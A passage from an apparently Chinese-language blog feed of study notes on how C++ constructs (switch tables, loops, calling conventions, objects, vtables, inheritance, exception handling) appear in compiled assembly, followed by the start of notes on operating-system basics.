title="switch"></a>switch</h4><ul><li><p>应c语言标准，如果在case语句块中没有break的话，则会从相应case语句块全部向下执行。因此switch在没有优化时，其判断跳转指令<code>cmp+jmp</code>等会连在一起，其各个case语句块也连在一起。</p></li><li><p>若case语句块内有break的话，会出现<code>jmp END</code>结尾的代码块，这里的END指的是switch的结尾</p></li><li><p>switch分支数<4时，模拟if-else优化。当分支数>=4时switch(n)根据判断的n是否有明显的线性关系有不同的优化方案</p></li><li><p>case标号为有序序列（比如1234567）：将这七个值对应的代码块地址按顺序存放到数组，如此一来<code>jmp short arr[i-1]</code>即可。这个数组也叫做case地址表。前提：每两个case值差值不大</p><blockquote><p>当然如果中间断了123567，那么会在<code>arr[4-1]</code>处放置default或是switch结束的代码块地址。</p><p>case的顺序是乱的话，如796584312，那么编译器会进行排序，之后按照上面规律。</p></blockquote></li><li><p>case序列差值较大（线性不强）但差值小于1B=256：若继续采用上述方案则会浪费许多空间。有两张表=case语句块地址表+case语句块索引表。</p><blockquote><p>地址表存放各个case语句块的起始地址，索引表存放对应case地址表下标</p></blockquote><p>switch(n)——》索引表的第n-1项——》获取对应地址表索引——》查找地址表——》得到跳转case语句块地址。对于不存在的case值，其索引表的值存放的则是default/switch结束代码块的在地址表中的下标</p></li><li><p>case序列差值&gt;256：采用平衡二叉树，将每个判定case值作为节点，找一个中间值作为根节点，大于向左，小于向右</p></li></ul><h4 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h4><ul><li>do-while：先做一次循环体，之后再判断，效率最高。也可用goto模拟</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*&#123;</span></span><br><span class="line"><span class="comment">do_while语句代码块。。</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">执行标志位影响指令</span></span><br><span class="line"><span class="comment">Jxx跳转到do_while语句代码块*/</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">do_while语句代码块</span></span><br><span class="line"><span class="comment">执行标志位影响指令</span></span><br><span class="line"><span class="comment">Jxx跳转到do_while语句结束块</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">跳转到do_while语句代码块</span></span><br><span class="line"><span class="comment">do_while结束块</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ul><li>while：先做判断，之后再执行循环体，效率其次。可以转为if+do_while的结构</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*&#123;</span></span><br><span class="line"><span class="comment">while语句代码块</span></span><br><span class="line"><span class="comment">执行影响标志位指令</span></span><br><span class="line"><span class="comment">Jxx跳转到while结束代码块</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">JMP跳转到while语句代码块</span></span><br><span class="line"><span class="comment">while语句结束代码块</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><ul><li>for循环：相当于while先赋初值，之后先判断再执行。可以优化为while循环</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*赋初值语句代码块</span></span><br><span class="line"><span class="comment">JMP跳转到for语句代码块</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">步长语句代码块（i++，或add（i）函数）</span></span><br><span class="line"><span class="comment">&#125;&#123;</span></span><br><span class="line"><span class="comment">for语句代码块</span></span><br><span class="line"><span class="comment">执行影响标志位的指令</span></span><br><span class="line"><span class="comment">Jxx跳转到for循环结束语句块</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">JMP跳转到步长语句代码块</span></span><br><span class="line"><span class="comment">for语句结束语句块/*</span></span><br></pre></td></tr></table></figure><ul><li>代码优化方面：优先转为do_while，不行就if+do_while。相同代码外提；运算替换等</li></ul><h3 id="函数的工作原理"><a href="#函数的工作原理" class="headerlink" title="函数的工作原理"></a>函数的工作原理</h3><p>先来解释几个概念</p><ul><li>栈帧：位于程序的栈区，夹在栈顶esp指针和栈底ebp指针之间。在32位中每4字节保存一个数据，64位中则是8字节（这里说的是物理上对齐后）。用于存放函数参数，函数返回地址，并帮助寻址局部变量</li><li>栈平衡：当A函数调用B函数时，B函数会建立上述栈帧，但实际情况下，在B函数生命周期过了之后，其中的局部变量就无法访问，也就是上述栈帧被清除关闭了，这个过程就叫栈平衡</li></ul><h4 id="调用方式与参数"><a href="#调用方式与参数" class="headerlink" title="调用方式与参数"></a>调用方式与参数</h4><p>上面我们说到，栈帧用于存放函数参数，调用方式就是说明如何存放这些参数，并由谁执行栈平衡操作</p><ul><li><code>_cdecl</code>：C/Cpp默认调用方式，参数从右向左压栈，由上面的A函数来平衡栈帧。</li><li><code>_stdcall</code>：被调方B平衡栈帧</li><li><p><code>_fastcall</code>：采用寄存器来传递参数，效率最高，由被调方B平衡栈。函数参数第一二个，使用ecx和edx存放，剩下的参数就通过栈传参</p></li><li><p><code>_cdecl</code>在优化后可以进行复写传播，将每次参数平衡的操作归并，也就是多个函数连续执行完后再一起平衡栈帧（<code>add esp 0x??</code>）</p></li></ul><blockquote><p>函数参数属于形参，因为是在栈帧中对原数据的拷贝，所以可以解释为什么修改形参不会改变原数据（引用指针这里不考虑）</p></blockquote><ul><li><p>在64位程序中只有一种寄存器快速调用约定：</p><ul><li>前四个参数依次使用RCX、RDX、R8、R9寄存器来存放，剩下的从右向左压栈，由函数调用方平衡栈空间</li><li>如果不是1、2、4、8字节的参数则通过引用传递</li><li>浮点参数使用XMM0~3寄存器传递（注意是顶替前面的四个R开头的通用寄存器）</li></ul><blockquote><p>前四个参数在栈中仍然会预留32字节的位置，因为占用了较多寄存器，所以当这些寄存器需要用于其他用途时，就会将寄存器中的函数参数暂存于此。该段空间由函数调用者提前申请</p></blockquote></li></ul><h4 id="ebp和esp寄存器"><a href="#ebp和esp寄存器" class="headerlink" title="ebp和esp寄存器"></a>ebp和esp寄存器</h4><p>前面我们讲到栈帧是夹在esp和ebp之间的，因此其中的元素都可以通过这两个指针+/—一定的偏移来获取</p><ul><li>在debug模式下，一般都会采用ebp来定位相应的参数和地址等。可以用于在函数退出前对esp的还原和栈平衡的检查</li><li>在优化后，只要栈顶是稳定的，就会不使用ebp，而使用esp来定位局部变量。</li><li>假如esp在执行过程中会改变的话，会有另一个空间来保存旧的esp，据此来定位局部变量</li><li>使用esp定位时，[esp+x]表明函数参数，[esp-x]表明局部变量，[esp]表明函数返回地址</li></ul><h4 id="不定参数"><a href="#不定参数" class="headerlink" title="不定参数"></a>不定参数</h4><ul><li><p>对于向printf()这种具有不定参数的函数，只能使用<code>_cdecl</code>调用方式。因为函数自身无法确定参数使用的栈空间大小，只能由调用者执行平衡操作</p></li><li><p>对于不定长参数有下列标准：</p><ul><li>至少有一个参数</li><li>所有的不定长参数类型传入时都是dword类型</li><li>需要在某个参数中表明参数总个数，或者有参数结束标志</li></ul><blockquote><p>例如printf传入的字符串中%说明了参数个数（转义符号除外）</p></blockquote></li></ul><h4 id="函数的返回"><a href="#函数的返回" class="headerlink" title="函数的返回"></a>函数的返回</h4><ul><li><p>在函数调用时，push完函数参数之后，就轮到call指令了，该指令除了将改变eip指针外，还会将下一条指令压入栈中（esp-4），用以在函数执行完成之后接着向下走</p></li><li><p>当函数执行完后，会执行ret指令，这个指令取得esp指向的内容作为函数的返回地址，更新eip寄存器，程序流程回到正轨，同时esp+4释放地址</p></li><li>返回值：使用eax寄存器存放，大于4字节则会用edx传递</li></ul><h3 id="内存中的变量"><a href="#内存中的变量" class="headerlink" title="内存中的变量"></a>内存中的变量</h3><p>作用域：变量在源码中可以被访问到的范围。全局变量在整个进程中都可以访问；静态变量属于文件作用域，其他的链接库无法访问；局部变量属于函数作用域</p><p>生命周期：变量所在内存从分配到释放的时间。</p><h4 id="全局变量和局部变量的区别"><a href="#全局变量和局部变量的区别" class="headerlink" title="全局变量和局部变量的区别"></a>全局变量和局部变量的区别</h4><ul><li>常量与全局变量都是在程序执行之前就存在了，也就是从程序装载到内存到main函数执行之前。在PE文件中，常量是不可写的，而全局变量和静态变量则是在可读可写的数据节中</li><li>具有初值的全局变量在链接时被写入创建的PE文件中，执行时则将其中数据填入到相应的虚拟内存地址中</li><li>全局变量通过内存地址（立即数）访问，局部变量则是通过栈指针加上偏移来访问。</li></ul><h4 id="局部静态变量工作方式"><a href="#局部静态变量工作方式" class="headerlink" title="局部静态变量工作方式"></a>局部静态变量工作方式</h4><p>静态变量包括全局静态和局部静态，全局静态变量=全局变量+限制外部文件访问</p><p>局部静态变量：</p><ul><li>不会随着作用域的结束而结束，生命周期和全局变量一样，也保存在数据区中</li><li>局部静态变量只会赋值一次，在汇编层面中通过<code>cmp</code>指令判断是否初始化过，如果初始化过则跳过初始化语句</li><li>编译器通过对局部静态变量重新命名，使得对其他作用域不可见</li></ul><h4 id="堆变量"><a href="#堆变量" class="headerlink" title="堆变量"></a>堆变量</h4><p>new——》malloc——》<code>_malloc_dbg</code>——》<code>heap_alloc_dbg_internal</code>，其中的<code>CrtMemBlockHeader</code>结构描述了堆空间的成员，堆结构的每个节点都是双向链表形式存储的</p><blockquote><p>当某个堆空间被释放后，再次申请堆空间时会检查这个堆空间是否满足要求，满足则再次利用。详细的可以查看另一篇“编译链接与装载”</p></blockquote><h3 id="数组和指针寻址"><a href="#数组和指针寻址" class="headerlink" title="数组和指针寻址"></a>数组和指针寻址</h3><p>数组名是一个常量值，而指针是一个变量能够修改</p><h4 id="一维数组与寻址"><a href="#一维数组与寻址" class="headerlink" title="一维数组与寻址"></a>一维数组与寻址</h4><p><strong>数组在函数内</strong>：</p><ul><li><p>函数内定义的数组，即局部变量。<code>int arr[]=&#123;1,2,3&#125;;</code>在栈中有3*4个字节空间，从低地址到高地址，依次是1，2，3。在汇编层面数组赋值时类型相同，而局部变量不同，可依此区分</p><blockquote><p>优化情况下，寻址过程中会使用常量传播，直接赋值，而非再次寻找数组中元素</p></blockquote></li><li><p>Cpp的字符串本身就是数组，最后使用一个0作为字符结束符。为字符串类型数组赋值时，本质上是赋值字符串的过程，每次赋值一个寄存器的长度（4/8字节）。若字符串长度不是4的倍数，则会被拆为，1字节（al）或者2字节（ax）复制</p><blockquote><p>有时也可能使用xmm等长16字节的寄存器</p></blockquote></li></ul><p><strong>数组作为参数</strong>：</p><ul><li><p>数组作为参数传递时，一般在形参处保存的是数组的首地址，也即是指针变量。</p><blockquote><p>对指针/形参中的数组名使用sizeof只能得到当前平台的指针长度，而strlen才能获取字符串长度</p></blockquote></li></ul><p><strong>数组作为返回值</strong>：</p><ul><li>返回局部数组的地址的话，由于是在栈中构建的，会因为栈平衡导致数组出问题。</li><li>可以使用全局数组、静态数组、上层调用函数中定义的局部数组。局部静态数组与局部静态变量略有不同，仅会检查一次初始化标志</li></ul><p><strong>下标寻址和指针寻址</strong></p><ul><li>指针寻址效率比下标寻址低。在指针寻址数据访问的过程中，比下标多一步寻址，也就是取出指针变量中存放的地址，而单纯下标寻址的话，由于数组名是一个常量，因此少了这一步。</li><li>下标寻址的下标值方式：<ul><li>下标值为整型常量：编译器直接计算得出数据所在位置</li><li>整型变量：只能先地址偏移，压缩为一个或多个公式</li><li>整形表达式：如果能常量折叠就执行，若有未知变量则同上</li></ul></li></ul><h4 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h4><ul><li><code>int arr[i][j]</code>等价于<code>int arr[i]  [j]</code>即2个长度3的数组，更高维的类似，如果其中有一个下标值为常量则不会出现二次寻址计算。在本质上还是一维数组<code>int arr[i*j]</code>即<code>arr + sizeof(int)*(i * N) + j</code>，节省了硬按照二维数组计算的一次寻址</li></ul><h4 id="指针数组与数组指针"><a href="#指针数组与数组指针" class="headerlink" title="指针数组与数组指针"></a>指针数组与数组指针</h4><p><strong>指针数组</strong>：</p><ul><li>即一个数组，里面存放的数据类型是指针，也就是其元素位数固定为4/8字节。<code>char * arr[3]=&#123;&quot;hello&quot;,&quot;world&quot;,&quot;!\0&quot;&#125;;</code></li><li>注意和二维数组的区别<code>char arr[3][8]=&#123;&#123;"hello"&#125;,&#123;"world"&#125;,&#123;"!\0"&#125;&#125;;</code>，这个arr[1]中存放的是一个char[8]的数组，其中的值是“hello”，而指针数组的arr[1]中存放的是一个4字节的指针，这个指针指向“hello”字符串</li></ul><p><strong>数组指针</strong>：</p><ul><li><p>即一个指针，其中存放的是arr（代指数组名常量），也就是数组的起始位置。<code>char (*p)[8]=arr;</code>即一个指针，指向上面的<code>char[3][8]</code>的数组，这个数组起始地址是arr，p++就相当于向后移动一个char[8]数组</p></li><li><p>第一次p[0]取得是arr[0]，p[0]就指向char[8]的数组。</p><blockquote><p>要注意和二级指针的区别，这种数组指针的类型为数组，其偏移长度依据数组而定，而和二级指针等价的是二维数组</p></blockquote></li></ul><h4 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h4><ul><li>函数指针是一个指针，其中保存的是函数的首地址。格式如此<code>int (_stdcall *func)(int, char**, char**)=main</code>，由返回值、参数信息、调用约定组成，在没有特别说明时，默认与Cpp编译器设置相同</li><li>函数指针其保存的信息为代码段的地址信息，因此不存在地址偏移的情况，且不允许加减乘除等操作</li></ul><h3 id="结构体和类"><a href="#结构体和类" class="headerlink" title="结构体和类"></a>结构体和类</h3><p>在Cpp中结构体和类都具有构造和析构函数，两者的唯一区别就是，结构体的默认访问控制是public，而类是private。结构体的访问控制都是在编译期间进行的，运行时的管不着</p><h4 id="对象内存布局"><a href="#对象内存布局" class="headerlink" title="对象内存布局"></a>对象内存布局</h4><p>一个对象中先定义的数据成员在低地址处，后定义的成员在高地址处，类成员函数属于执行代码，不属于类对象的数据。关于对象占用的空间有下面三个特殊情况</p><ul><li><p>空类：空类占一字节，即使其中没有任何数据，也需要这样一个指针代表该类；此外可能只是没有成员数据，但有很多成员函数</p></li><li><p>内存对齐：</p><ul><li><p>Cpp默认的8字节对齐，对于数据成员最大长度为M（有数组的话，则按照其中的单个元素长度计算），则选择对齐值q=min{M,8}，之后成员的地址就会安排在q倍数上的地址。</p><blockquote><p><code>#pragma pack(N)</code>可以调整对齐大小，但是仍然满足上面的规则</p></blockquote></li><li><p>A嵌套结构体B时，在A中仍按照上述规则计算，此时B的长度按照其对齐值计算</p></li></ul></li><li><p>静态数据成员：</p><ul><li>存放的位置和全局变量一致，计算对象长度时不被包含，无需this指针访问</li><li>多个对象共享一个静态成员，编译时会检查只有同类对象可以共享此空间</li><li>静态数据成员是常量地址，可通过立即数间接寻址的方式访问</li></ul></li></ul><h4 id="this指针"><a href="#this指针" class="headerlink" title="this指针"></a>this指针</h4><p>首先this指针肯定是一个指针类型，占据4/8字节大小，其中保存了对象的首地址，之后取数据成员的话，就是直接算偏移即可</p><ul><li>类成员函数（非静态成员函数）中都会有一个隐藏的参数this，这种调用方式为<code>thiscall</code>（无法显示定义）</li><li>对于<code>thiscall</code>，一般情况下都是将this指针存放到ecx寄存器中进行传递，而后面的其他参数同<code>__stdcall</code>相同，并由被调方负责栈平衡操作</li><li>如果显示定义了其他调用方式（<code>__stdcall</code>），则通过栈传递this指针</li></ul><h4 id="对象作为参数和返回值"><a href="#对象作为参数和返回值" class="headerlink" title="对象作为参数和返回值"></a>对象作为参数和返回值</h4><ul><li><p>对象作为函数参数传递时</p><ul><li><p>会在栈空间中建立一个备份对象（当然会执行构造析构等），之后复制数据，在函数内部将使用这个临时对象的this指针</p></li><li><p>需要注意，这里的复制是浅拷贝，会使两个对象指向同一块内存，可能会出现重复释放。可以使用深拷贝或者智能指针等操作</p></li></ul></li><li><p>对象作为返回值时</p><ul><li>一般来说32位下eax，64位下rax，但可能不够，如果返回局部对象的地址或者引用的话，会因为函数周期致使内部局部对象消失从而访问无效数据</li><li>操作和作为参数传递时相同，都是会额外开辟一个栈空间，将返回对象的数据复制到这个空间，之后以这个临时栈空间的首地址作为返回值</li></ul></li></ul><h3 id="构造和析构函数"><a href="#构造和析构函数" class="headerlink" title="构造和析构函数"></a>构造和析构函数</h3><p>类对象生成时调用构造函数，销毁时调用析构函数；前者可以函数重载，后者是一个无参函数（有个隐藏参数this），都不可“定义”返回值；调用构造函数后返回值为对象首地址，即this指针</p><h4 id="构造函数出现时机"><a href="#构造函数出现时机" class="headerlink" title="构造函数出现时机"></a>构造函数出现时机</h4><ul><li><p>局部对象：进入对象的作用域时，编译器就会调用其构造函数的代码，会传递this指针这个隐形参数；构造函数调用结束后也会返回this指针</p></li><li><p>堆对象：new申请堆空间之后，会调用构造函数，如果new失败的话，会避开构造，返回一个NULL指针。对于多个对象，即<code>new []</code>时，还会用到代理函数来统一构造过程（将各个对象的首地址依次作为this指针来构造）</p><blockquote><p><code>new []</code>时会在堆空间的前4字节/8字节存放对象总个数。</p></blockquote></li><li><p>参数与返回对象：对象作为函数参数时会调用复制构造函数（默认的就是浅拷贝），该函数仅有一个（&amp;对象）的参数；对于返回对象的话大致同上，但是返回对象则是在函数<strong>返回</strong>时使用复制构造函数，正常情况下就是复制两次，局部=》临时=》接收</p><blockquote><p>PS：优化时可能会出现直接将对象p作为引用参数添加到函数中执行</p></blockquote></li><li><p>全局与静态对象：构造时机相同，其构造函数初始化是在<code>mainCRTStartup</code>中的<code>_cinit</code>中实现的，这些对象会由构造代理函数完成调用全局构造函数。</p></li></ul><blockquote><p>开优化时，某些类因为用处不大会直接被变为基础变量的组合，从而就没有构造析构函数一说。当本类/父类的成员中，包含虚函数或，自带构造函数时，编译器会提供默认构造函数，也就是不会优化掉类</p></blockquote><h4 id="析构函数出现时机"><a href="#析构函数出现时机" class="headerlink" title="析构函数出现时机"></a>析构函数出现时机</h4><ul><li><p>局部对象：对象所在作用于结束后就会调用析构函数</p></li><li><p>堆对象：都会一个析构代理函数间接调用各类的析构函数，和构造相似，但顺序相反，先析构堆数组中最后一个，之后再依次向前</p></li><li><p>参数与返回对象：</p><ul><li><p>函数的参数为对象类型时，会在函数调用结束后调用他们的析构函数，之后释放空间。</p></li><li><p>作为返回对象时，如果<code>Person p=getPerson()</code>则会将p作为参数传递进去，如果p是之前定义过的，则会正常进行</p><blockquote><p>有个特殊情况，<code>Number = getNumber(), printf(&quot; &quot;);</code>其返回的临时对象会在该行结束后才析构，有点偏离正常人逻辑了</p></blockquote></li></ul></li><li><p>全局与静态对象：和构造时类似，在main函数结束调用之后，由exit结束进程，其中的<code>_execute_onexit_table</code>实现析构。</p><blockquote><p>整理一下全局的过程：初始化函数=》构造代理函数=》构造函数=》atexit注册析构代理函数（同样也是用于传递this指针给析构函数）</p></blockquote></li></ul><h3 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h3><p><code>virtual</code>声明函数为虚函数，当类中有定义时，编译器会将所有虚函数的首地址保存在一张地址表中，这张表叫做虚函数地址表，即虚表，同时类中还会有一个隐藏的数据成员，虚表指针用来指向这个表</p><ul><li>虚表指针初始化是编译器在构造函数中插入代码完成的，即使没有自己写，编译器也会生成专门初始化虚表指针的构造函数</li><li>虚表地址相对固定，其中的函数地址排序依据声明顺序而定</li><li>虚表指针一般都是在对象的首地址处</li><li>在构造函数中初始化虚表指针，执行析构函数时会还原虚表指针，让其指向自身的虚表首地址，防止在析构函数中调用虚函数时取到非自身的虚表（需要和后面继承相联系）</li></ul><p>虚函数识别的特征：</p><ul><li>类中隐式定义了一个数据成员，在首地址，占一个指针大小；</li><li>其指向是某个数据区位置，这个表中每个表项都指向一个函数；</li><li>这些函数被调用时第一个参数必然是this指针</li></ul><blockquote><p><code>int __cdecl atexit(void (__cdecl*)(void));</code>可以在退出main函数后执行开发者自定义函数（无参数，无返回值），即注册终止函数</p></blockquote><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p><strong>一般</strong>来说：指向父类对象的指针可以指向父类对象和子类对象；但是指向子类对象的指针不能操作父类对象</p><h4 id="类和类之间的关系"><a href="#类和类之间的关系" class="headerlink" title="类和类之间的关系"></a>类和类之间的关系</h4><ul><li><p>子类能使用父类中public和protect的成员，而对于private成员来说，在子类的内存结构中是存在的，其访问仅在编译期间做检查</p></li><li><p>子类对象被销毁时，编译器为子类提供了默认的析构函数，先执行自身的析构代码，之后再执行父类的析构代码</p></li><li><p>构造顺序：先构造父类=》按照声明顺序构造成员对象和初始化列表中指定的成员=》自身的构造代码；</p><blockquote><p>在内存上父类的数据成员也总是排在最前面，也是为什么子类指针可以当父类指针用</p></blockquote></li><li><p>使用子类指针访问父类时，访问成员是父类对象中定义的则不会出错，如果访问的是子类派生的成员数据则会造成访问越界</p></li><li><p>析构顺序：首先调用自身的析构函数=》调用成员对象的析构函数=》父类的虚构函数</p><blockquote><p>在析构时会首先将虚表指针设置为自身虚表，之后依据析构对象更改虚表指针</p></blockquote></li><li><p>最好将析构函数声明为虚析构函数，防止出现堆上内存重复释放</p></li></ul><h4 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h4><ul><li>即一个类同时继承了多个父类，在内存中会按照继承父类的顺序，从左到右依次排序</li><li>继承n个父类就会有n个虚表指针，其中保存了父类的虚函数和子类的虚函数（父子类重名函数的按照子类定义）</li><li>根据继承关系，会首先调用第一个父类的构造函数，之后向后调整指针位置至下一个父类地址，再将其作为this指针传递（析构类似，也是传递每个父类位置作为this指针）</li><li><code>parent * p= child;</code>时会调整传递的地址，并不是child的首地址，而是其中继承的parent部分的首地址</li></ul><h4 id="抽象类"><a href="#抽象类" class="headerlink" title="抽象类"></a>抽象类</h4><ul><li><code>virtual void hello()=0;</code>即为纯虚函数，含有该函数的类为抽象类（纯虚类），抽象类不负责定义具体功能，需要继承类强制实现</li><li>继承自抽象类的子类都具有虚表和虚表指针</li><li>在抽象类的虚表信息中，纯虚函数没有实现代码，因此没有首地址，为防止误调，编译器会将纯虚函数的地址编为<code>__purecall</code>（在gcc下为<code>__exa_pure_virtual</code>）</li></ul><h4 id="虚继承"><a href="#虚继承" class="headerlink" title="虚继承"></a>虚继承</h4><ul><li><p>背景：Cpp允许D类同时继承多个父类（如BC类），从而形成了菱形继承（BC类又都继承A类）的问题：A类在D类中相当于重复了</p></li><li><p>在BC继承A时加入<code>virtual</code>关键字，如：<code>class B: virtual public A</code>，而D正常继承即可（no关键字virtual）</p></li><li><p>在MSVC、clang中对内存结构中每个父类的虚表指针后面都添加了一个虚基类偏移表（GCC照常）；</p></li><li><p>D的内存中会依次是：：B的虚表指针+B的虚基类偏移表指针+B的独特成员=》C的虚表指针+C的虚基类偏移表指针+C的独特成员=》D的独特成员=》A的虚表指针+A的独特成员</p></li><li><p>虚基类偏移表vfTableB中保存了两个偏移量：（拿B类的偏移表举例），</p></li></ul><div class="table-container"><table><thead><tr><th>类D相对于vfTableB偏移</th><th>类D中的类B相对于vfTableB的偏移</th></tr></thead><tbody><tr><td></td></tr></tbody></table></div><ul><li><p>在VS和clang编译器中，调用时需要传入一个标志参数，标记1时构造<strong>本类的父类</strong>，标记0时跳过上述构造。也就是说对于上述例子：A先构造，BC跳过父类构造（仅构造B-A∩C-A的部分），D也跳过父类构造（D-B∩C∩A）</p><blockquote><p>GCC不适用上述标记，会生成一个父类构造代理函数，该函数不会调用虚基类构造函数</p></blockquote></li><li><p>虚继承结构的析构中，会先依次执行CB的析构函数，最后再A的析构</p></li></ul><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>GCC、clang编译器的异常处理取决于使用的异常库、MSVC编译器的异常处理与Windows的SEH机制有关（这里是win下的）。Cpp异常处理=try、throw、catch语句组成；即检测异常——产生异常——抛出异常——捕获异常</p><p>异常处理步骤：</p><ol><li>函数入口处设置异常回调函数，当函数内抛出异常时会执行该函数。回调函数先将eax设置为<code>FuncInfo</code>数据（其中记录异常有关信息）的地址，然后跳往<code>__CxxFrameHandler</code>函数</li><li>异常的抛出由<code>__CxxThrowExpection</code>函数完成，该函数使用了两个参数，一个是抛出异常的关键字<code>throw</code>的参数指针，另一个是抛出信息类型的指针<code>ThrowInfo*</code></li><li>在异常回调函数中，可得到异常对象的地址和对应<code>ThrowInfo</code>数据的地址以及<code>FuncInfo</code>表结构的地址。根据记录的异常类型，进行try块的匹配工作</li><li>若没有找到try块，则析构异常对象，返回<code>ExceptionContinueSearch</code>继续下一个异常回调函数的处理</li><li>找到对应的try块时，通过<code>TryBlockMapEntry</code>表结构中的<code>pCatch</code>指向catch信息表，用<code>ThrowInfo</code>表结构中的异常类型遍历查找与之相关的catch块，比较关键字名称，找到有效cathc块</li><li>执行栈展开操作，产生catch块中使用的异常对象</li><li>正确析构所有生命周期已经结束的对象</li><li>跳转到catch块，执行catch块代码</li><li>调用<code>__JumpToContinuation</code>函数，返回所有catch语句块的结束地址</li></ol><p><img src="https://s2.loli.net/2024/08/08/sod3QEFD5VhUnGL.png" alt="try-catch.png"></p><p>补充说明：</p><ul><li>FuncInfo=14B</li><li>FuncInfo中maxState记录异常需要展开的次数，UnwindMapEntry则记录展开时需要执行的函数</li><li>TryBlockMapEntry用于判断异常出现在哪个try块中，msRttiDscr则表明try块下的各个catch块信息，包括以表格形式记录的TypeDescriptor即异常类型</li><li>ThrowInfo用于记录抛出的异常类型，该异常对应的catch块类型在CatchTableType中（CatchTableTypeArray可以理解为Catch数组的元说明）</li></ul>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
            <tag> Re </tag>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OS of 王道</title>
      <link href="/2024/02/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
      <url>/2024/02/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="计算机系统概述"><a href="#计算机系统概述" class="headerlink" title="计算机系统概述"></a>计算机系统概述</h3><h4 id="操作系统基本概念"><a href="#操作系统基本概念" class="headerlink" title="操作系统基本概念"></a>操作系统基本概念</h4><p>什么是操作系统：首先操作系统是一种软件（系统软件），OS负责管理各种计算机硬件，是处在用户和硬件之间的中间层，为应用程序提供基础，OS控制并协调应用程序对硬件的使用与分配。</p><p>操作系统特征（前两个最基本）：</p><ul><li><p>并发：在一个时间段内有两个或以上的事件发生。并行则是同一时刻有两个及以上</p></li><li><p>共享：系统中的资源可以同时供多个并发执行的进程共同使用。主要包括下面两种</p><ul><li>互斥共享方式：例如打印机，只有当A访问完成后才能给B访问，这样的资源也叫做<strong>临界资源</strong></li><li>同时访问方式：同时指的是并发一样的时间段上“同时”</li></ul></li><li><p>虚拟：一个实际上东西，使用起来感觉有好多，即虚拟技术。</p></li><li><p>异步：一个事件基本不可能直接运行完，必定有停顿。换到多个时间上来说就是不清楚其他事件跑到哪里了</p></li></ul><p>操作系统功能（侧重于软件）：</p><ul><li><p>对于计算机系统资源的管理=处理机管理+存储器管理+文件管理+设备管理</p></li><li><p>为用户提供了接口=命令接口+程序接口（理解为API即可）</p><blockquote><p>命令接口=联机命令接口/交互式命令接口（cmd命令）+脱机命令接口/批处理命令接口（bat脚本）</p></blockquote></li><li><p>对计算资源的扩充。裸机+操作系统=扩充机器/虚拟机</p></li></ul><h4 id="操作系统发展历程"><a href="#操作系统发展历程" class="headerlink" title="操作系统发展历程"></a>操作系统发展历程</h4><ol><li>手工操作阶段：一张纸条处理完等待下一个</li><li>单道批处理系统：多张纸条放在一起，自动处理下一个</li><li>多道批处理系统：一次吞入好几个纸条，基于前面的并发的思想</li><li>分时操作系统：多个用户共享一台计算机，将并发的思想放置到用户上</li><li>实时操作系统：由于分时操作无法处理紧急任务而诞生，包括硬实时和软实时，前者对于特定操作必定会在某个时间内处理，后者则相对宽松</li><li>网络操作系统&amp;分布式操作系统：对于用户来说操作多台计算机就像一台一样，但后者则看起来更像一台（相互协同完成同一个任务）</li><li>个人计算机操作系统：阿巴阿巴……</li></ol><h4 id="操作系统运行环境"><a href="#操作系统运行环境" class="headerlink" 